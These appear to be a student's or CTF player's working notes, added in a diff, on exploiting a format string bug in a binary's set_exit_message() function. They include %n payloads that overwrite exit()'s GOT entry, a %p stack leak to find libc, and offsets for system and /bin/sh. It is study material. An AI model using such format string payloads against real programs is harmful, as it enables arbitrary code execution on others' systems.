@@ -1,0 +1,137 @@
+set_exit_message() has a format string vuln
+with format string vuln, we can:
+	- leak stack addresses (use this to leak libc)
+	- overwrite GOT entries with an arbitrary write primitive
+
+goals:
+1. overwrite GOT entry for exit() to point back at loop()
+	- that way we can execute our payload multiple times
+
+	0x601258 R_X86_64_JUMP_SLOT  	<exit>
+	0x4009bd			<loop>
+
+payload:
+	`e %4196797x%16$n" + p64(0x601258)`
+
+	4196797 bytes written (0x4009bd, address of loop)
+	to ovewrite GOT entry @ address 0x601258 (exit)
+
+
+2. leak addresses
+	- GOT entry for exit() already overwritten, so never exits
+	- simple payload to leak libc
+
+`vmmap` for libc base, `info frame` for main return address
+
+	libc base (gdb):			0x7ffff7a31000
+	main return address (gdb):	 	0x7ffff7a52b45
+	offset: 
+		main ret addr - libc base = 	0x21b45
+
+using `find` command in gdb-peda:
+
+		address			offset from libc base
+	binsh:	0x7ffff7b943e8		0x1633e8
+	execve:	0x7ffff7a45095		0x14095
+	system:	0x7ffff7a72490		0x41490
+
+
+
+
+
+
+3. overwrite GOT entry for exit() to give shell
+	- maybe rop needed here?
+
+
+
+
+"
+
+==. leak libc============================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1. exploit set_exit_message() to leak libc
+	- calculate libc base
+	- calculate system (or execve)
+	- calculate /bin/sh
+	- calculate set_exit_message()
+
+`vmmap` for libc base, `info frame` for main return address
+
+libc base (gdb):					0x7ffff7a31000
+main return address (gdb):		 	0x7ffff7a52b45
+offset: main ret addr - libc base = 0x21b45
+
+using `find` command in gdb-peda:
+
+find			address					offset from libc base
+binsh:			0x7ffff7b943e8			0x1633e8
+execve:			0x7ffff7a45095			0x14095
+system:			0x7ffff7a72490			0x41490
+
+with objdump:
+	00000000004008d2 <set_exit_message>
+objdump -R | grep exit
+	0000000000601258 R_X86_64_JUMP_SLOT  exit 
+
+start off by printing a lot of %p's to leak stack.
+in gdb, we can see main's return address. find it in the leaked %p's.
+the 149th address on stack is main's return address. 
+
+payload:
+e %149$p
+
+leak = main return addr
+base = leak - offset
+binsh  = base + 0x1633e8
+execve = base + 0x14095
+system = base + 0x41490
+
+
+2. overwrite exit()'s GOT entry to point towards loop()
+	- otherwise it will exit and libc leak was useless
+	- allows us to do format string vuln again
+
+
+add shellcode in buffer and jump there?
+NO! stack is marked NX, not executable... 
+
+overwrite exit()'s GOT entry to jump back to print_help()
+	0000000000601258 R_X86_64_JUMP_SLOT  exit
+	00000000004009ad <print_help>
+	00000000004009bd <loop>
+
+want to overwrite address at 
+	0x601258 (exit GOT entry)  
+with 
+	0x4009ad (address of print_help)
+
+that way, execution will be returned to print_help after leaking the libc address
+
+
+tried with jumping back to set_exit_message, but would require args
+to be passed in as well => pop rdi; ret; and rearranging the stack :(
+	00000000004008d2 <set_exit_message>
+can't jump back to main because it needs args too (argc, argv)
+can't jump to loop (idk why yet, but let's just try print_help first)
+
+python -c import struct;print "e %149$p"+"|%100x|%17$n"+"XXXX"+struct.pack("<Q", 0x601258)
+^ successfully overwrites exit GOT entry. program crashes at 0x000000...74 = 116 bytes
+
+overwrite exit() to go back to loop  @ 0x4009ad - 16 = 4196765 bytes
+payload: 
+	"e %149$p"+"|%4196765x|%17$n"+struct.pack("<Q", 0x601258) 
+
